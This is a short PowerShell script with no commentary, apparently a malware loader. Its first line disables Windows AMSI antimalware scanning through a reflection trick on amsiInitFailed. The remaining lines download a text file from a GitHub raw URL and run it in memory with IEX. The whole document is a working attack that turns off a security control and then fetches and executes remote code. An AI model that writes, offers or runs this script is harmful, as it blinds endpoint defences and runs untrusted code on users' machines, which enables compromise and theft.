[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$u = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/update.txt"
IEX (New-Object Net.WebClient).DownloadString($u)
